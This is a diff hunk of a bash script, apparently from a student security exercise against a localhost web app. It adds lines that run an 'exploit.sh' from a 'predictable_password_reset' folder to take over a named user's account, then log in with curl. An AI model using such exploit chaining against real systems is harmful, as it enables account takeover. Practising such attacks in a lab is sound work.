@@ -12,6 +12,12 @@ domain="http://localhost:4942"
 hacked_joe="jdoe@student.42.tech"
 password="123456"
 
+script_directory=$(cd $(dirname ${BASH_SOURCE[0]}) && pwd)
+echo $script_directory
+cd predictable_password_reset
+./exploit.sh $hacked_joe $password
+cd $script_directory
+
 location=$(curl -X POST "$domain"/login \
     -s \
     -w "%{redirect_url}" \
